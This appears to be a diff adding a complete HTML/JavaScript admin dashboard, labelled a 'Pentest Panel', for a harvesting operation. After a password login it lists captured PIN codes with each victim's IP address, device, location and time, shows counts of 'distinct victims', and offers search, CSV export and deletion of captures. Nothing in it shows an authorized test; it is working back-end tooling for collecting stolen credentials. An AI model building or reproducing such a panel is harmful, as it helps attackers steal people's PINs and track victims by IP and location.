@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard — Pentest Panel</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Segoe UI',-apple-system,sans-serif; background:#0f0f1a; color:#e0e0e0; min-height:100vh; }
+        
+        .login-container { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
+        .login-box { background:#1a1a2e; padding:40px; border-radius:20px; width:100%; max-width:400px; border:1px solid rgba(255,255,255,0.1); }
+        .login-box h1 { font-size:24px; margin-bottom:5px; }
+        .login-box p { color:#888; margin-bottom:25px; font-size:14px; }
+        .login-box input { width:100%; padding:14px 18px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.15); border-radius:10px; color:#fff; font-size:16px; outline:none; margin-bottom:15px; }
+        .login-box input:focus { border-color:#ff4444; }
+        .login-box button { width:100%; padding:14px; background:linear-gradient(135deg,#ff4444,#cc0000); border:none; border-radius:10px; color:#fff; font-size:16px; font-weight:700; cursor:pointer; }
+        .login-error { color:#ff4444; font-size:13px; margin-bottom:10px; text-align:center; }
+        
+        .dashboard { display:none; }
+        .header { background:#1a1a2e; padding:16px 24px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.1); position:sticky; top:0; z-index:100; }
+        .header-left { display:flex; align-items:center; gap:15px; }
+        .header-left h1 { font-size:20px; }
+        .header-left .badge { background:#ff4444; padding:4px 12px; border-radius:20px; font-size:12px; font-weight:700; }
+        .header-right { display:flex; align-items:center; gap:12px; }
+        .connection-status { font-size:12px; padding:6px 12px; border-radius:20px; }
+        .connected { background:rgba(0,200,83,0.15); color:#00c853; }
+        .disconnected { background:rgba(255,68,68,0.15); color:#ff4444; }
+        .logout-btn { background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); color:#fff; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; }
+        
+        .content { padding:24px; max-width:1400px; margin:0 auto; }
+        .stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:16px; margin-bottom:24px; }
+        .stat-card { background:#1a1a2e; padding:20px; border-radius:14px; border:1px solid rgba(255,255,255,0.06); }
+        .stat-card .stat-label { font-size:13px; color:#888; text-transform:uppercase; letter-spacing:1px; }
+        .stat-card .stat-value { font-size:36px; font-weight:800; margin-top:8px; }
+        .stat-card .stat-sub { font-size:12px; color:#666; margin-top:4px; }
+        .stat-card.red .stat-value { color:#ff4444; }
+        .stat-card.green .stat-value { color:#00c853; }
+        .stat-card.blue .stat-value { color:#448aff; }
+        .stat-card.yellow .stat-value { color:#ffd740; }
+        
+        .controls { display:flex; justify-content:space-between; align-items:center; margin-bottom:16px; flex-wrap:wrap; gap:10px; }
+        .controls-left { display:flex; gap:10px; flex-wrap:wrap; }
+        .btn { padding:10px 20px; border:none; border-radius:8px; font-size:13px; font-weight:600; cursor:pointer; }
+        .btn-refresh { background:#448aff; color:#fff; }
+        .btn-export { background:#00c853; color:#fff; }
+        .btn-clear { background:rgba(255,68,68,0.15); color:#ff4444; border:1px solid rgba(255,68,68,0.3); }
+        .search-box { padding:10px 16px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.12); border-radius:8px; color:#fff; font-size:14px; outline:none; min-width:200px; }
+        
+        .table-container { background:#1a1a2e; border-radius:14px; border:1px solid rgba(255,255,255,0.06); overflow-x:auto; }
+        table { width:100%; border-collapse:collapse; }
+        thead { background:rgba(255,255,255,0.03); }
+        th { padding:14px 16px; text-align:left; font-size:12px; text-transform:uppercase; letter-spacing:0.5px; color:#888; font-weight:600; border-bottom:1px solid rgba(255,255,255,0.06); white-space:nowrap; }
+        td { padding:12px 16px; border-bottom:1px solid rgba(255,255,255,0.04); font-size:14px; }
+        tr:hover td { background:rgba(255,255,255,0.02); }
+        .pin-badge { background:linear-gradient(135deg,#ff4444,#cc0000); color:#fff; padding:4px 12px; border-radius:6px; font-family:'Courier New',monospace; font-weight:700; font-size:16px; letter-spacing:2px; }
+        .device-badge { font-size:12px; padding:4px 10px; border-radius:4px; }
+        .device-android { background:rgba(76,175,80,0.15); color:#4caf50; }
+        .device-ios { background:rgba(0,0,0,0.15); color:#aaa; }
+        .device-windows { background:rgba(33,150,243,0.15); color:#2196f3; }
+        .ip-text { font-family:'Courier New',monospace; color:#448aff; font-size:13px; }
+        .time-text { font-size:12px; color:#888; white-space:nowrap; }
+        .delete-btn { background:none; border:none; color:#ff4444; cursor:pointer; font-size:18px; opacity:0.4; padding:4px 8px; }
+        .delete-btn:hover { opacity:1; }
+        .empty-state { text-align:center; padding:60px 20px; color:#666; }
+        .empty-state .big-icon { font-size:48px; margin-bottom:16px; }
+        .empty-state h3 { font-size:20px; margin-bottom:8px; color:#888; }
+        .refresh-info { font-size:12px; color:#666; margin-bottom:10px; }
+        
+        @media (max-width:768px) {
+            .content { padding:12px; }
+            .header { padding:12px 16px; }
+            .header-left h1 { font-size:16px; }
+            .stats-grid { grid-template-columns:repeat(2,1fr); }
+            .stat-card .stat-value { font-size:24px; }
+            th, td { padding:10px 12px; font-size:12px; }
+            .controls { flex-direction:column; align-items:stretch; }
+            .search-box { width:100%; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="loginSection" class="login-container">
+    <div class="login-box">
+        <h1>🔒 Admin Panel</h1>
+        <p>Enter admin password</p>
+        <div id="loginError" class="login-error"></div>
+        <input type="password" id="passwordInput" placeholder="Enter admin password" onkeypress="if(event.key==='Enter')login()">
+        <button onclick="login()">🔑 LOGIN</button>
+    </div>
+</div>
+
+<div id="dashboardSection" class="dashboard">
+    <div class="header">
+        <div class="header-left">
+            <h1>📊 Pentest Dashboard</h1>
+            <span class="badge" id="liveCount">0</span>
+        </div>
+        <div class="header-right">
+            <span id="connectionStatus" class="connection-status disconnected">● Disconnected</span>
+            <button class="logout-btn" onclick="logout()">🚪 Logout</button>
+        </div>
+    </div>
+    
+    <div class="content">
+        <div class="stats-grid">
+            <div class="stat-card red"><div class="stat-label">Total Captures</div><div class="stat-value" id="statTotal">0</div><div class="stat-sub">All time</div></div>
+            <div class="stat-card blue"><div class="stat-label">Unique IPs</div><div class="stat-value" id="statIPs">0</div><div class="stat-sub">Distinct victims</div></div>
+            <div class="stat-card yellow"><div class="stat-label">Unique PINs</div><div class="stat-value" id="statPins">0</div><div class="stat-sub">Different codes</div></div>
+            <div class="stat-card green"><div class="stat-label">Last Hour</div><div class="stat-value" id="statHour">0</div><div class="stat-sub">In last 60 min</div></div>
+        </div>
+        
+        <div class="controls">
+            <div class="controls-left">
+                <button class="btn btn-refresh" onclick="fetchData()">🔄 Refresh</button>
+                <button class="btn btn-export" onclick="exportCSV()">📥 Export CSV</button>
+                <button class="btn btn-clear" onclick="clearAll()">🗑️ Clear All</button>
+            </div>
+            <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search IP, PIN, device..." onkeyup="filterTable()">
+        </div>
+        
+        <div class="refresh-info">Auto-refresh every 10 seconds | <span id="lastUpdate">--</span></div>
+        
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>PIN Code</th>
+                        <th>IP Address</th>
+                        <th>Device</th>
+                        <th>Location</th>
+                        <th>Date & Time</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="dataBody">
+                    <tr><td colspan="7"><div class="empty-state"><div class="big-icon">📡</div><h3>Waiting for captures...</h3><p>No data yet</p></div></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<script>
+const API_BASE = '/api';
+let token = '';
+let allData = [];
+
+async function login() {
+    const pwd = document.getElementById('passwordInput').value;
+    try {
+        const resp = await fetch(API_BASE + '/login', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({password: pwd})
+        });
+        const data = await resp.json();
+        if (data.status === 'ok') {
+            token = data.token;
+            document.getElementById('loginSection').style.display = 'none';
+            document.getElementById('dashboardSection').style.display = 'block';
+            fetchData();
+            document.getElementById('connectionStatus').className = 'connection-status connected';
+            document.getElementById('connectionStatus').textContent = '● Connected';
+            setInterval(fetchData, 10000);
+        } else {
+            document.getElementById('loginError').textContent = '❌ Invalid password';
+        }
+    } catch(e) {
+        document.getElementById('loginError').textContent = '❌ Connection error';
+    }
+}
+
+function logout() {
+    token = '';
+    document.getElementById('dashboardSection').style.display = 'none';
+    document.getElementById('loginSection').style.display = 'flex';
+}
+
+async function fetchData() {
+    if (!token) return;
+    try {
+        const resp = await fetch(API_BASE + '/data', {
+            headers: {'Authorization': 'Bearer ' + token}
+        });
+        if (!resp.ok) { if (resp.status === 401) logout(); return; }
+        const data = await resp.json();
+        if (data.status === 'ok') {
+            allData = data.data || [];
+            renderTable();
+            updateStats();
+            document.getElementById('lastUpdate').textContent = 'Last update: ' + new Date().toLocaleTimeString();
+        }
+    } catch(e) {}
+}
+
+function updateStats() {
+    const total = allData.length;
+    const uniqueIPs = new Set(allData.map(d => d.ip)).size;
+    const uniquePins = new Set(allData.map(d => d.pin)).size;
+    const oneHourAgo = new Date(Date.now() - 3600000);
+    const lastHour = allData.filter(d => d.timestamp && new Date(d.timestamp) > oneHourAgo).length;
+    
+    document.getElementById('statTotal').textContent = total;
+    document.getElementById('statIPs').textContent = uniqueIPs;
+    document.getElementById('statPins').textContent = uniquePins;
+    document.getElementById('statHour').textContent = lastHour;
+    document.getElementById('liveCount').textContent = total;
+}
+
+function renderTable() {
+    const tbody = document.getElementById('dataBody');
+    const search = (document.getElementById('searchBox').value || '').toLowerCase();
+    let filtered = allData;
+    
+    if (search) {
+        filtered = allData.filter(d => 
+            (d.pin||'').toLowerCase().includes(search) ||
+            (d.ip||'').includes(search) ||
+            (d.device||'').toLowerCase().includes(search) ||
+            (d.location||'').toLowerCase().includes(search)
+        );
+    }
+    
+    if (filtered.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="7"><div class="empty-state"><div class="big-icon">📡</div><h3>No data</h3></div></td></tr>';
+        return;
+    }
+    
+    let html = '';
+    filtered.forEach((d, i) => {
+        const deviceClass = (d.device||'').includes('Android') ? 'device-android' : (d.device||'').includes('iOS') ? 'device-ios' : (d.device||'').includes('Windows') ? 'device-windows' : '';
+        const time = d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A';
+        html += '<tr><td>' + (i+1) + '</td><td><span class="pin-badge">' + escapeHtml(d.pin||'') + '</span></td><td><span class="ip-text">' + escapeHtml(d.ip||'') + '</span></td><td><span class="device-badge ' + deviceClass + '">' + escapeHtml(d.device||'') + '</span></td><td>' + escapeHtml(d.location||'N/A') + '</td><td><span class="time-text">' + time + '</span></td><td><button class="delete-btn" onclick="deleteEntry(\'' + (d.id||'') + '\')">✕</button></td></tr>';
+    });
+    tbody.innerHTML = html;
+}
+
+function filterTable() { renderTable(); }
+
+async function deleteEntry(id) {
+    if (!confirm('Delete entry?')) return;
+    try {
+        await fetch(API_BASE + '/delete', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json','Authorization':'Bearer '+token},
+            body: JSON.stringify({id})
+        });
+        fetchData();
+    } catch(e) {}
+}
+
+async function clearAll() {
+    if (!confirm('Delete ALL data?')) return;
+    if (!confirm('Sure?')) return;
+    try {
+        await fetch(API_BASE + '/delete', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json','Authorization':'Bearer '+token},
+            body: JSON.stringify({id:'all'})
+        });
+        fetchData();
+    } catch(e) {}
+}
+
+function exportCSV() {
+    if (allData.length === 0) return alert('No data');
+    let csv = 'Time,PIN,IP,Device,Location\n';
+    allData.forEach(d => {
+        csv += (d.timestamp||'') + ',' + (d.pin||'') + ',' + (d.ip||'') + ',' + (d.device||'') + ',' + (d.location||'') + '\n';
+    });
+    const blob = new Blob([csv], {type:'text/csv'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'captures_' + new Date().toISOString().slice(0,10) + '.csv';
+    a.click();
+}
+
+function escapeHtml(text) {
+    if (!text) return '';
+    return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+</script>
+</body>
+</html>
